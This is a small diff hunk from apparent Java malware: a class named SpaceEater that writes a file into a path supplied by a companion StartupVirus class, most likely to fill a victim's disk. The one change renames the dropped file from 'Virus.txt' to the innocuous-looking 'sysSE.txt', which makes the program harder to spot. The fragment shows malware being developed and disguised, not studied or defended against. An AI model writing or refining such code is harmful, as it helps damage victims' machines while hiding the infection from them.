@@ -13,7 +13,7 @@ public class SpaceEater {
 
 	public static void main(String[] args) {
 		try {
-			File mFile = new File(StartupVirus.getPathToSetFile() + "\\Virus.txt");
+			File mFile = new File(StartupVirus.getPathToSetFile() + "\\sysSE.txt");
 			FileWriter fileWriter = new FileWriter(mFile);
 			BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
 
